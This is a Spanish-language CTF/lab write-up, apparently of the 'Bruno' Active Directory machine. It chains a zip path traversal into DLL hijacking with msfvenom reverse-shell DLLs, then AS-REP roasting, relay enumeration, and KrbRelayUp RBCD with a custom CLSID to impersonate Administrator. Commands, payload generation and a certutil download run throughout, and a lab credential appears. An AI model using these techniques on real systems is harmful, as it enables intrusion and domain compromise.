---
title: "Bruno ⭐️"
---

# Bruno ⭐️

<img src="/images/pasted-image-20260721210312.png" alt="Pasted image 20260721210312">

<img src="/images/pasted-image-20260721211017.png" alt="Pasted image 20260721211017">

```
start_unauth 10.129.238.9 bruno.vl
```

Hay login anónimo en [FTP](/network-pentest/pentest-by-ports/21-ftp)

```bash
wget -r ftp://10.129.238.9/
```

Tratamos de buscar credenciales con `strings -e l`,  sin éxito

<img src="/images/pasted-image-20260721234121.png" alt="Pasted image 20260721234121">

Tampoco podemos subir archivos

```bash
nxc ftp 10.129.238.9 -u '' -p '' --put test queue
```

Tratamos de fuzzear, no encontramos nada.

```bash
gobuster dir -u http://10.129.238.9/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 150 -k --no-error -b 404,400 -x asp,aspx
```

```bash
gobuster dir -u https://10.129.238.9/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 150 -k --no-error -b 404,400 -x asp,aspx
```

Usamos dogbolt.org para descompilar el .exe, pero esta ultra ofuscado

Lo traemos a una W11 y lo tratamos de ejecutar

<img src="/images/pasted-image-20260723174020.png" alt="Pasted image 20260723174020">

<img src="/images/pasted-image-20260723181537.png" alt="Pasted image 20260723181537">

<img src="/images/pasted-image-20260723181900.png" alt="Pasted image 20260723181900">

```bash
mkdir C:\samples\queue
mkdir C:\samples\benign
mkdir C:\samples\malicious
```

Ponemos un `.exe` en queue y ahora parece ser que si lo procesa.

Reverseamos el `.dll` con dnspy.

Básicamente se busca la string en el archivo y si se encuentra se clasifica como virus o no.

```c
// SampleScanner.Program
// Token: 0x06000002 RID: 2 RVA: 0x00002060 File Offset: 0x00000260
private static void Main(string[] args)
{
	string text = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EYCAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	text.Replace("EYCAR", "EICAR");
	byte[] bytes = Encoding.ASCII.GetBytes(text);
	string[] files = Directory.GetFiles("C:\\samples\\queue\\", "*", SearchOption.AllDirectories);
	int i = 0;
	while (i < files.Length)
	{
		string text2 = files[i];
		if (text2.EndsWith(".zip"))
		{
			using (ZipArchive zipArchive = ZipFile.OpenRead(text2))
			{
				foreach (ZipArchiveEntry zipArchiveEntry in zipArchive.Entries)
				{
					string destinationFileName = Path.Combine("C:\\samples\\queue\\", zipArchiveEntry.FullName);
					zipArchiveEntry.ExtractToFile(destinationFileName);
				}
				File.Delete(text2);
				goto IL_10E;
			}
			goto IL_B8;
		}
		goto IL_B8;
		IL_10E:
		i++;
		continue;
		IL_B8:
		if (Program.PatternAt(File.ReadAllBytes(text2), bytes).Any<int>())
		{
			File.Copy(text2, text2.Replace("queue", "malicious"), true);
			File.Delete(text2);
			goto IL_10E;
		}
		File.Copy(text2, text2.Replace("queue", "benign"), true);
		File.Delete(text2);
		goto IL_10E;
	}
}

```

Básicamente se puede aprovechar `.ExtractToFile()` para hacer un Path Traversal

🔗 https://hacktricks.wiki/en/generic-hacking/archive-extraction-path-traversal.html#net-pathcombine--ziparchive-traversal

Vamos a ver también [que DLLs carga](/network-pentest/privilege-escalation/windows) con procmon

<img src="/images/pasted-image-20260723211111.png" alt="Pasted image 20260723211111">

En teoría hay 2 DLLs que no se están encontrando y que se tratan de buscar en el directorio `/app`, la cosa es que vamos a necesitar permisos de escritura en esa carpeta

<img src="/images/pasted-image-20260724153333.png" alt="Pasted image 20260724153333">

No podemos escribir desde FTP, vamos a aprovechar los usuarios que ya hemos encontrado en archivos

<img src="/images/pasted-image-20260724153924.png" alt="Pasted image 20260724153924">

<img src="/images/pasted-image-20260724153958.png" alt="Pasted image 20260724153958">

`svc_scan` es vulnerable a as-rep roast

<img src="/images/pasted-image-20260724154135.png" alt="Pasted image 20260724154135">

<img src="/images/pasted-image-20260724154209.png" alt="Pasted image 20260724154209">

```
svc_scan \ Sunshine1
```

Podemos escribir en la carpeta queue solo.

<img src="/images/pasted-image-20260724154546.png" alt="Pasted image 20260724154546">

Podemos tratar de aprovechar el path traversal para escribir en `/app`

Vamos a probar primero si está funcionando con esto:

```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
    z.writestr("../app/0xdf.txt", "ABCD")
```

```bash
smbclient //10.129.238.9/queue -U 'svc_scan%Sunshine1'
```

Y funciona

<img src="/images/pasted-image-20260724180227.png" alt="Pasted image 20260724180227">

Probamos con `bcrypt.dll`

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.3 LPORT=4444 -f dll -o bcrypt.dll
```

```python
import zipfile

dll = "bcrypt.dll"

with zipfile.ZipFile("slip.zip", "w") as z:
    z.write(dll, arcname="../app/bcrypt.dll")
    
```

Probamos con la otra dll

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.3 LPORT=4444 -f dll -o hostfxr.dll
```

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/powershell_reverse_tcp; set LHOST 10.10.15.3; set LPORT 4444; exploit"
```

No recibimos nada.
Probamos con una de 64 bits

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f dll -o hostfxr.dll
```

Después de reiniciar la máquina unas cuantas veces termina funcionando

Ldap no esta firmado de ninguna forma.
Además según netexec el Channel Binding está desactivado.
Y hay un endpoint de enrollment de ADCS.

<img src="/images/pasted-image-20260726171610.png" alt="Pasted image 20260726171610">

Según certipy hay un posible ESC8

```bash
certipy find -vulnerable -u 'svc_scan' -p 'Sunshine1' -dc-ip 10.129.36.12
```

<img src="/images/pasted-image-20260726171926.png" alt="Pasted image 20260726171926">

| **Mecanismo**            | **Objetivo principal**     | **¿Qué ataque previene?**                 | **¿Cómo funciona?**                                                                          |
| ------------------------ | -------------------------- | ----------------------------------------- | -------------------------------------------------------------------------------------------- |
| **LDAP Signing**         | **Integridad**             | Man-in-the-Middle (modificación de datos) | Añade una firma criptográfica a cada paquete para asegurar que no fue alterado en tránsito.  |
| **LDAP Channel Binding** | **Autenticidad del túnel** | NTLM Relay hacia LDAPS                    | Vincula la autenticación (ej. NTLM) al túnel cifrado TLS específico que originó la petición. |

El problema es que no podemos hacer un ESC8 solo con un DC.

Lanzamos RelayKing y no nos tira mucha cosa

```bash
python3 relayking.py -u 'svc_scan' -p 'Sunshine1'  -d bruno.vl --dc-ip 10.129.36.12 -vv --audit --protocols smb,ldap,ldaps,mssql,http,https --threads 10 -o plaintext,json --output-file relayking-scan --proto-portscan --ntlmv1
```

<img src="/images/pasted-image-20260726173800.png" alt="Pasted image 20260726173800">

Recientemente ha salido una vulnerabilidad en ADCS: CertiGhost

🔗 https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26

🔗 https://github.com/aniqfakhrul/CVE-2026-54121

Seguramente no sea el intended Path, pero vale la pena probarlo:

Se cumple la condición de poder crear Máquinas

<img src="/images/pasted-image-20260726174213.png" alt="Pasted image 20260726174213">

Pero no tenemos permiso de inscripción en ninguna plantilla según certipy.

Enumeramos CVEs y nos tira unos cuantos

```bash
nxc smb 10.129.36.164 -u 'svc_scan' -p 'Sunshine1' -M enum_cve
```

<img src="/images/pasted-image-20260727224140.png" alt="Pasted image 20260727224140">

Es vulnerable a varios métodos de coerción:

<img src="/images/pasted-image-20260727224602.png" alt="Pasted image 20260727224602">

De todas formas SMB está firmado así que de poco sirve.

Tendríamos que hacer un reflection de Kerberos a Ldap

Probamos de entrada un reflection de SMB a LDAP con `--remove-mic`

```bash
sudo $(which ntlmrelayx.py) -t ldap://10.129.36.164 --escalate-user svc_scan -smb2support --remove-mic
```

```bash
nxc smb 10.129.36.164 -u 'svc_scan' -p 'Sunshine1' -M coerce_plus -o 'LISTENER=10.10.15.3'
```

<img src="/images/pasted-image-20260727232515.png" alt="Pasted image 20260727232515">

Hacer kerberos relay/reflection tiene sentido por dos cosas

1. Si no se usa NTLM en el entorno
2. <img src="/images/pasted-image-20260727233602.png" alt="Pasted image 20260727233602">

Nos lo clonamos y compilamos en Release con Visual Studio

🔗 https://github.com/Dec0ne/KrbRelayUp/tree/main

```bash
certutil -urlcache -f http://10.10.15.3/KrbRelayUp.exe KrbRelayUp.exe 
```

Probamos la técnica de Shadow Credentials primero, pero se queda petado.

```bash
.\KrbRelayUp.exe full -m shadowcred --ForceShadowCred
```

Probamos RBCD:

```bash
.\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName evilhost$ -ComputerPassword Evil123!
```

```bash
.\KrbRelayUp.exe spawn -Domain bruno.vl -ComputerName evilhost$ -ComputerPassword Evil123!
```

<img src="/images/pasted-image-20260728140120.png" alt="Pasted image 20260728140120">

Probamos con adcs y tampoco

```bash
.\KrbRelayUp.exe spawn -Domain bruno.vl -ComputerName evilhost$ -ComputerPassword Evil123!
```

<img src="/images/pasted-image-20260728142731.png" alt="Pasted image 20260728142731">

Vamos a necesitar un CLSID custom, no el que pone por defecto `KrbRelayUp.exe`

- **El Engaño:** JuicyPotato engaña al sistema operativo para que un proceso que se ejecuta como `SYSTEM` intente autenticarse contra un servidor COM falso que el atacante ha levantado localmente en la máquina.
    
- **La Invocación:** Para forzar a `SYSTEM` a realizar esta conexión, JuicyPotato utiliza la API de Windows (`CoGetInstanceFromIStorage`) para solicitar la creación de un objeto COM específico a través de DCOM (COM distribuido).
    
- **La Necesidad del CLSID:** Para que Windows sepa _qué_ objeto COM de nivel `SYSTEM` debe instanciar, **necesitas pasarle el CLSID de ese objeto**

Ejecutamos

🔗 https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1

El siguiente script pilla la lista, mira que servicios COM están activos y los intenta instanciar

```powershell
Import-Csv Windows_Server_2022_Datacenter\CLSIDs.csv | ForEach-Object { $entry = $_; try { $svc = Get-Service $entry.LocalService -ErrorAction Stop; if ($svc.Status -eq "Running") { try { [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($entry.CLSID.Trim("{}")))|Out-Null; "$($entry.LocalService) | $($entry.CLSID) | Activate OK" } catch { if ($_.Exception.Message -match "80070005") { $r = "Access Denied" } elseif ($_.Exception.Message -match "80040111") { $r = "Class Not Available" } elseif ($_.Exception.Message -match "80070422") { $r = "Service Disabled" } else { $r = "Failed" }; "$($entry.LocalService) | $($entry.CLSID) | $r" } } } catch {} }
```

Encontramos `CertSvc`

<img src="/images/pasted-image-20260728144140.png" alt="Pasted image 20260728144140">

```bash
.\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName evilhost2$ -ComputerPassword Evil123! -cls '{D99E6E73-FC88-11D0-B498-00A0C90312F3}' -p 10246
```

<img src="/images/pasted-image-20260728150624.png" alt="Pasted image 20260728150624">

Y ahora ya podemos impersonar al Administrator

```bash
getST.py -spn 'HOST/brunodc.bruno.vl' -impersonate administrator -dc-ip 10.129.36.216  'bruno.vl/evilhost2$:Evil123!'
```

```bash
nxc smb BRUNODC -u 'administrator' -k --use-kcache -x 'type C:\\Users\Administrator\Desktop\root.txt'
```

<img src="/images/pasted-image-20260728152410.png" alt="Pasted image 20260728152410">
